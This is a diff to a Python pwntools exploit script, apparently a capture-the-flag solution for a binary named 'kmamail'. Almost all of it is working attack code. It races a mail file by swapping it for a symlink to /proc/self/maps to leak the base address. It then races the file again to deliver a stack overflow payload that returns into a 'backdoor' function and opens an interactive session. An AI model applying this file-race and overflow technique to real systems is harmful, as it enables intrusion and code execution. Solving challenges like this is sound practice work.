@@ -1,8 +1,13 @@
-#!/usr/bin/env python3
 from pwn import *
 import os, re, time, shutil
 
 context.binary = elf = ELF("./kmamail", checksec=False)
+
+gs = '''
+set pagination off
+b usleep
+run
+'''
 
 
 def start():
@@ -11,17 +16,17 @@ def start():
     else:
         return process(elf.path)
 
-def m(io, x): io.sendlineafter(b"> ", str(x).encode())
+def mes(io, x): io.sendlineafter(b"> ", str(x).encode())
 
-def reg(io, u, p):
-    m(io, 1)
-    io.sendlineafter(b"Username: ", u)
-    io.sendlineafter(b"Password: ", p)
+def reg(io, name, passwd):
+    mes(io, 1)
+    io.sendlineafter(b"Username: ", name)
+    io.sendlineafter(b"Password: ", passwd)
 
-def login(io, u, p):
-    m(io, 2)
-    io.sendlineafter(b"Username: ", u)
-    io.sendlineafter(b"Password: ", p)
+def login(io, name, passwd):
+    mes(io, 2)
+    io.sendlineafter(b"Username: ", name)
+    io.sendlineafter(b"Password: ", passwd)
 
 def put(path, data=None, link=None):
     if os.path.lexists(path):
@@ -36,16 +41,15 @@ def main():
         shutil.rmtree("./data")
 
     io = start()
-    u = b"a"
-    p = b"a"
-    mail = "./data/a/mail"
+    name = b"huhu"
+    passwd = b"racecondition101"
+    mail = "./data/huhu/mail"
 
-    reg(io, u, p)
-    login(io, u, p)
+    reg(io, name, passwd)
+    login(io, name, passwd)
 
     put(mail, b"A"*0x400)
-    m(io, 2)
-    time.sleep(0.15)
+    mes(io, 2)
     put(mail, link="/proc/self/maps")
     out = io.recvuntil(b"---- MENU ----")
 
@@ -56,12 +60,11 @@ def main():
     base = int(s, 16) - int(off, 16)
 
     ret = base + 0x101a
-    bd  = base + elf.sym.backdoor
+    win  = base + elf.sym.backdoor
 
     put(mail, b"0123456789")
-    m(io, 2)
-    time.sleep(0.15)
-    put(mail, b"S\nT\n" + b"A"*0x2c + p8(0x57) + p64(ret) + p64(bd) + b"\n")
+    mes(io, 2)
+    put(mail, b"\n\n" + b"A"*0x2c + p8(0x57) + p64(ret) + p64(win) + b"\n")
 
     io.interactive()
 
